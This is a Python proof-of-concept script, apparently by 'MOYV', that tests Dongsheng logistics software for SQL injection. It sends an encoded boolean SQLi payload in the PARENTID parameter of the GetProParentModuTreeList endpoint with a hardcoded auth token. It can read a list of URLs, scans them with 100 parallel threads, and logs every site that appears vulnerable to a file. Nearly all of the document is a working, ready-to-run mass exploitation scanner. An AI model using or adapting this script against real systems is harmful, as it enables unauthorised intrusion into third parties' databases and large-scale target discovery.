import requests, sys, argparse
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()


def banner():
    banner = '''  
                                   author:MOYV  
'''
    print(banner)


def poc(target):
    payload = "/MvcShipping/MsBaseInfo/GetProParentModuTreeList?PARENTID=%27+AND+4757+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28122%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%284757%3D4757%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29+AND+%27KJaG%27%3D%27KJaG"
    url = target + payload
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
        'x-auth-token': '36ef438edd50bf8dd51fba642a82c3b7d272ff38',
        'Content-Type': 'text/html; charset=utf-8',
        'Connection': 'close'
    }
    try:
        res = requests.get(url=url, headers=headers, verify=False, timeout=10)
        if res.status_code == 200:
            print(f"[+]{target}存在漏洞\n")
            with open('东胜_result.txt', 'a', encoding='utf-8') as fp:
                fp.write(target + "\n")
        else:
            print(f"[-]{target}不存在漏洞")
    except:
        print(f"[*]该url存在问题")

def main():
    banner()
    parse = argparse.ArgumentParser(description="东胜物流软件_sqli漏洞脚本")
    parse.add_argument("-u", "--url", dest="url", type=str, help="Please enter url")
    parse.add_argument("-f", "--file", dest="file", type=str, help="Please enter file")
    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n", ""))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()